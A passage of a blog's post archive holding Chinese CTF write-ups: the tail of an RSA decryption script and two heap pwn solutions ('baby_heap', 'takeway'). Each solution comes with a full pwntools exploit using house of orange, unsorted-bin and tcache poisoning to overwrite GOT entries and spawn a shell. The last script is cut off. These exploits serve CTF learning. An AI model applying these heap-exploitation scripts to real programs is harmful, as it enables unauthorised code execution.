class="line">n = <span class="number">330961752887996173328854935965112588884403584531022561119743740650364958220684640754584393850796812833007843940336784599719224428969119533284286424077547165101460469847980799370419655082069179038497637761333327079374599506574723892143817226751806802676013225188467403274658211563655876500997296917421904614128056847977798146855336939306463059440416150493262973269431000762285579221126342017624118238829230679953011897314722801993750454924627074264353692060002758521401544361385231354313981836056855582929670811259113019012970540824951139489146393182532414878214182086999298397377845534568556100933934481180701997394558264969597606662342898026915506749002491326250792107348176681795942799954526068501499100232598658650184565873243525176833451664254917655703178472944744658628534195346977023418550761620254528178516972066618936960223660362493931786389085393392950207048675797593816271435700130995225483316625836104802608163745376633884840588575355936746173068655319645572100149515524131883813773486917122153248495022372690912572541775943614626733948206252900473118240712831444072243770979419529210034883903111038448366933374841531126421441232024514486168742686297481063089161977054825621099768659097509939405315056325336120929492838479309609958696957890570295444494277819063443427972643459784894450787015151715676537385237767990406742547664321563688829289809321534752244260529319454316532580416182438749849923354060125229328043961355894086576238519138868298499249023773237770103057707912709725417033309061308880583988666463892828633292839968866953776989722310954204550783825704710017434214644199415756584929214239679433211393230307782953067246529626136446314941258877439356094775337541321331600788042698664632064112896956898222397445497695982546922871549828242938368486774617350420790711093069910914135319635330786253331223459637232106417577225350441291</span></span><br><span class="line">p = <span class="number">16486456392568284654575447481741337432037045210800881835922614280067095597403710005455885867829534599108105197853120121574779191481125315722964257888873579099800690068397728960335561315717619132097747891006990987234219773215951341290375325467839650020485843410133760476863038747605417567970738312428198804291743647184526806692092507258393049800262129700391618652453916902141512582838357424455278388992820311182042750759628796263458005206211851622898042001270110860445227518098099442496544291487453616861604254291750411887857595093636553437331170435660475454672143330589299824376076547689051724844786337326281769222107417355877587836699896745726567628092282995399905968099655245359825181671342180522153867520458557378100805495885728965517124749113185924078688116625743891547407248459361185534137655598794841381345072595952173547088910141316887889085791098603541066183857855045537851225348728432140633429582547355875169018387146998010651697236311238281309072462571334886501953441278420091394620498419461947569630534013992500053942893075863031452593127978173868322268503740398804653340332478754797272662812261231775395620689300949393859423566492311584685742006804194387349833713097736389655660701086473349762351032974011890884285149086019</span> </span><br><span class="line">q = <span class="number">20074765917385746960935546244046943454462816043103272528361092579826674512173765241930755746125701611787832050933381141287876969868161022364171839735197812750520430729316788310479069323911390204105953536522038545353910488349500120367222425966798487691717708110938190921291433703777234979917798631930961003842873264252345740246004565354378673284300771278077629291983142857452945395644496169376540506242324806217396415838590757988653416655884020806407076836843763182293453375883193557418497971808909707169877529993060558008071543221829096316946680943004116896967543999782332968077171180309491946947119885153993121862489</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q*p = &#x27;</span>,q*p,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> n == p*q:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n == p * q&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n != p * q&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(n-p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n-q = &#x27;</span>,n-q,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023SICTF-Pwn-baby_heap-wp</title>
    <url>/2023/09/22/comp%20-%202023SICTF-Pwn-baby_heap-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
baby一点都不baby...houseoforange+unsortedbinattack
</blockquote>
<span id="more"></span>
<h1 id="x00-逆向分析">0x00 逆向分析</h1>
<ol type="1">
<li>main函数很简单，1申请2编辑3打印，但是没有free，google'no free
pwn'了解到有可能是houseoforange</li>
<li>add函数，两个约束（1. 最多申请32个chunk 2.
chunk最大为0x1000），跟进chunk_size和chunk_ptr后发现两者在bss段挨得很近，所以这里其实可以伪造fake_chunk，后续可以考虑用fastbin
attack或者unsortedbin
attack来打（但这里没有free，就导致fastbin很难利用） <img
src="/pic/Pasted%20image%2020230922101040.png" /></li>
<li>edit函数 <img src="/pic/Pasted%20image%2020230922101820.png" /></li>
<li>show函数，只打印了8个字节就很难受 <img
src="/pic/Pasted%20image%2020230922101901.png" /></li>
</ol>
<h1 id="x01-思路分析">0x01 思路分析</h1>
<ol type="1">
<li>我们肯定是要实现“leak libc”和“Any Address Write”
<ol type="1">
<li>leak libc
<ol type="1">
<li>思路1：unsortedbin leak
<ol type="1">
<li>理论上可行，但由于show只打印八个字节，所以必须要把unsortedbin里的chunk申请出来再打印，这样就会浪费一个chunk，后续利用比较麻烦</li>
</ol></li>
<li>思路2：在bss段伪造fake_chunk写入got表，直接write出来</li>
</ol></li>
<li>Any Address Write
<ol type="1">
<li>思路1：常规unsortedbin attack
<ol type="1">
<li>比较麻烦，我的评价是不如unsortedbin申请fake_chunk</li>
</ol></li>
<li>思路2：unsortedbin 申请 fake_chunk
<ol type="1">
<li>将victim.bk设置为fake_chunk_head，申请两次即可获得</li>
</ol></li>
</ol></li>
</ol></li>
<li>将写入的got表改写为og即可提权</li>
</ol>
<h1 id="x02-具体步骤">0x02 具体步骤</h1>
<ol type="1">
<li>由于add函数中，chunk_size会截断size，所以我们想要伪造0x111大小的chunk（Q1）的话，就必须要申请一个0x111，一个0x1大小的chunk才能正确伪造size段，而申请16个0x100大小的chunk是为了把0x4040c0-0x4040d0置零，即莫名其妙的八个字节（Q2）和fake_chunk的prev_size段
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  alloc(<span class="number">0x100</span>,payload) <span class="comment"># chunk0 - chunk15</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x111</span>,payload)   <span class="comment"># chunk16</span></span><br><span class="line">alloc(<span class="number">1</span>,payload)       <span class="comment"># chunk17</span></span><br></pre></td></tr></table></figure></li>
<li>houseofOrange，此时unsortedbin中会有一个大小为0xdc0的chunk，记为victim
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xdc1</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x1000</span>,payload) <span class="comment">#18</span></span><br></pre></td></tr></table></figure></li>
<li>伪造victim.bk = 0x4040c8（fake_chunk_head） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + flat(<span class="number">0x111</span>,<span class="string">b&#x27;deadbeef&#x27;</span>,<span class="number">0x4040c8</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure></li>
<li>连续申请2个chunk，在chunk_ptr[0]的位置写入malloc_got，调用show函数中的write，即可获得libc
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">malloc_got = elf.got[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(malloc_got)</span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">dump(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;libc_base   ---&gt;   <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>调用edit函数，在chunk_ptr[0]指向的地址（即malloc的libc地址）写入og，调用malloc即可提权
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;libc_base   ---&gt;   <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">payload = p64(libc_base + one_gadget[<span class="number">3</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="x03-一些问题">0x03 一些问题</h1>
<p>Q1： 为什么必须要伪造0x111大小的chunk呢？<br />
Q2：
我感觉申请8个chunk就够了...把fake_chunk_head修改为0x4040c0也不是不行啊？</p>
<h1 id="x04-完整exp">0x04 完整EXP</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./baby_heap&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./baby_heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/e/EdgeDownload/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>, content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;Content :&#x27;</span>, content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment"># --------------------------------------------------------</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  alloc(<span class="number">0x100</span>,payload) <span class="comment"># chunk0 - chunk15</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x111</span>,payload)   <span class="comment"># chunk16</span></span><br><span class="line">alloc(<span class="number">1</span>,payload)       <span class="comment"># chunk17</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xdc1</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x1000</span>,payload) <span class="comment">#18</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + flat(<span class="number">0x111</span>,<span class="string">b&#x27;deadbeef&#x27;</span>,<span class="number">0x4040c8</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">malloc_got = elf.got[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(malloc_got)</span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">dump(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;libc_base   ---&gt;   <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">payload = p64(libc_base + one_gadget[<span class="number">3</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023第七届蓝帽杯初赛Pwn-takeway-wp</title>
    <url>/2023/08/26/comp%20-%202023%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BPwn-takeway-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
学艺不精...对于"读/写函数对指针的利用"没那么敏感（
</blockquote>
<span id="more"></span>
<h1 id="xff-说在前面">0xff 说在前面</h1>
<p>下文EXP中，leak堆地址的部分需要"伪爆破"，如果报错的话多运行两三次脚本，直到heap_addr为四字节时即可成功运行
<a href="https://cowtransfer.com/s/bf2ac55a69364d">题目地址</a>下载口令:
7c9pe6</p>
<h1 id="x00-exploitations">0x00 Exploitations</h1>
<ol type="1">
<li>tcachebin libc2.31
<ol type="1">
<li>tcachebin poisoning</li>
<li>版本判断
<ol type="1">
<li>tcache有key混淆，则是2.31以上(不包含2.31)</li>
<li>tcache有doublefree检测，则是2.28以上</li>
<li>有tcache，则是2.26及以上</li>
</ol></li>
</ol></li>
<li>UAF</li>
<li>利用题目提供的堆表+puts/read进行任意地址读写</li>
</ol>
<h1 id="x01-反汇编修改">0x01 反汇编修改</h1>
<pre><code>    首先进行一个反汇编的读   </code></pre>
<blockquote>
<p>trick: IDA中对变量按Y键可以改变变量类型</p>
</blockquote>
<p><img src="/pic/Pasted%20image%2020230826230935.png" /> alloc:
strcspn是从字符串中返回不含“所查找字符”的子字符串的长度 <img
src="/pic/Pasted%20image%2020230826231015.png" /> delete:
指针未置零，一眼UAF <img
src="/pic/Pasted%20image%2020230826231112.png" /> modify <img
src="/pic/Pasted%20image%2020230826231127.png" /></p>
<h1 id="x02-分析与思路构造">0x02 分析与思路构造</h1>
<blockquote>
<p>分析部分</p>
</blockquote>
<ol type="1">
<li>分析alloc: 只给了五次创建堆的机会，堆的大小都固定为0x28
<ol type="1">
<li>没办法直接用unsortedbin leak libc</li>
<li>不能通过填满tcachebin来绕过tcache机制</li>
<li>tcachebins poisoning
<ol type="1">
<li>能拿到堆地址: 通过gdb找偏移来在堆区伪造chunk</li>
<li>能拿到栈地址: 通过gdb找偏移来在栈区伪造chunk</li>
</ol></li>
</ol></li>
<li>分析modify: 有puts/read
<ol type="1">
<li>可能通过puts"直到遇到换行符才停止输出"的原理来泄露什么东西</li>
</ol></li>
<li>分析delete
<ol type="1">
<li>UAF</li>
</ol></li>
<li>远程测试libc版本
<ol type="1">
<li>doubleFree有限制，2.28以上</li>
<li>没有key混淆bk，可以直接拿到堆地址，2.31及以下</li>
</ol></li>
</ol>
<blockquote>
<p>思路构造部分</p>
</blockquote>
<p>最开始没patchelf，只能free两个chunk到tcachebin里，通过泄露fd的方式来泄露堆地址，然后我想tcachebin
poisoning把堆中大小为0x1011的缓冲区下面的那一部分给修改一下，改成unsortedbin然后获取libc，再poison到got表修改free，最后提权。但这样消耗的chunk数目远大于5个。</p>
<p>后来patch以后发现bk里就有堆地址，然后又想到临近top chunk的unsorted
bin会被合并。于是把目标对准了heapList。想通过修改heapList的size段位0x1041来伪造一个unsortedbin，然后leak
libc。结果也是需要大量chunk，而且还申请失败了，现在没搞明白为啥失败了不说，连报错都忘了，无从下手了（</p>
<p>打完比赛以后跟N1nEmAn师傅沟流了一下，发现题目如果能在heapList伪造chunk的话，就可以通过modify函数里的puts和read任意地址读写了。我直接震撼HeyGap一百年。</p>
<p>综上，思路为：<br />
1. 利用tcachebin的bk泄露堆地址 2.
在heapList伪造chunk，修改chunk0_ptr为"puts_got-8" 3.
puts会打印puts_got指向的地址，即puts_libc_addr，然后计算system地址 4.
通过gdb发现"puts_got-8"正好是"free_got" 5.
而read函数正好是修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
6. 由于chunk0_ptr,
chunk1_ptr均被修改，所以我们要找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh
7. free chunk2 --&gt; getshell！ # 0x03 分步解题 1.
patchelf，根据远程调试选择了libc2.31 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;$ORIGIN/&#x27; file_name</span><br><span class="line">patchelf --set-interpreter my-ld-linux.so.2 my-program</span><br><span class="line">patchelf --replace-needed liboriginal.so.1 libreplacement.so.1 my-program</span><br></pre></td></tr></table></figure></p>
<ol start="2" type="1">
<li>利用tcachebin的bk泄露堆地址 可以看到bk是指向tcachebin_entries[3]的
<img src="/pic/Pasted%20image%2020230827001916.png" />
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = payload2 = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">alloc(<span class="number">0</span>,payload1,payload2)</span><br><span class="line">alloc(<span class="number">1</span>,payload1,payload2)     <span class="comment"># 这里申请了chunk1其实对这一步没啥用，下一步申请也行</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">5</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># 注：这里我没想到更好的方法，heap_addr有可能是三字节</span></span><br><span class="line">															  也有可能是四字节，所以后续如果报错多试几次就行。</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload)</span><br></pre></td></tr></table></figure></li>
<li>通过tcache poisoning在heapList段伪造chunk2， <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)                        <span class="comment"># 把上一步申请的chunk1放进tcachebin</span></span><br><span class="line"><span class="comment"># gdb.attach(io)                 # 通过bins命令可以看到现在是tcachebin_entries[3] -&gt; chunk1 -&gt; chunk0</span></span><br><span class="line">payload = p64(heap_addr + <span class="number">0x290</span>) <span class="comment"># 改为tcachebin_entries[3] -&gt; chunk1 -&gt; (heap_addr + 0x290)</span></span><br><span class="line">fill(<span class="number">1</span>,payload)                  </span><br><span class="line">alloc(<span class="number">2</span>,payload1,payload2)       <span class="comment"># 把chunk1申请出来，bins变为tcachebin_entries[3] -&gt; (heap_addr + 0x290)</span></span><br></pre></td></tr></table></figure></li>
<li>申请chunk2，同时把puts_got-8写进heapList[0]，然后通过modify函数中的puts泄露libc（笔误:
下图“加上下一个chunk的prev_size构成了chunk2”中的"chunk2"应为chunk3）
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1 = p64(puts_got-<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">3</span>,payload1,payload2)</span><br><span class="line">fill(<span class="number">3</span>,payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;this order is: &#x27;</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure> <img src="/pic/Pasted%20image%2020230827003153.png" />
读者也可以通过<code>x/20gx 0x404020</code>来查看Libc中free的下一个地址是不是puts<br />
</li>
<li>修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr  = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload1)</span><br></pre></td></tr></table></figure></li>
<li>找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh然后free掉他，getshell！
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="x04-完整exp">0x04 完整EXP</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">domain_name = <span class="string">&#x27;101.200.234.115&#x27;</span></span><br><span class="line">port = <span class="number">42490</span></span><br><span class="line">file = <span class="string">&#x27;./takeway&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./takeway&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">index,name,remark</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;name: &#x27;</span>, name)</span><br><span class="line">  io.sendafter(<span class="string">&#x27;remark: &#x27;</span>, remark)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index,name</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, name)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">alloc(<span class="number">0</span>,payload1,payload2)</span><br><span class="line">alloc(<span class="number">1</span>,payload1,payload2)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">5</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = p64(heap_addr + <span class="number">0x290</span>)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line">alloc(<span class="number">2</span>,payload1,payload2)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1 = p64(puts_got-<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">3</span>,payload1,payload2)</span><br><span class="line">fill(<span class="number">3</span>,payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;this order is: &#x27;</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr  = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">payload1 = 